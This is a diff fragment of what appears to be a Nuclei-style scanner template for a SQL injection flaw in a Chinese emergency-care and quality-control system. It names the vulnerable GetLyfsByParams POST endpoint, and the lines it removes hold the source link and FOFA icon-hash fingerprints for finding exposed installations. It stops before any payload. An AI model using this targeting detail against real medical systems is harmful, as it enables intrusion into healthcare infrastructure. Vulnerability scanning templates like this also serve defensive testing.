@@ -3,12 +3,8 @@ info:
   name: 扁鹊飞救智能急救与质控系统 GetLyfsByParams SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kqram3ym3gvqa9ol'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kqram3ym3gvqa9ol
-    fofa: icon_hash="-757866684" || icon_hash="-1206146847
 http:
 - raw:
   - 'POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetLyfsByParams HTTP/1.1
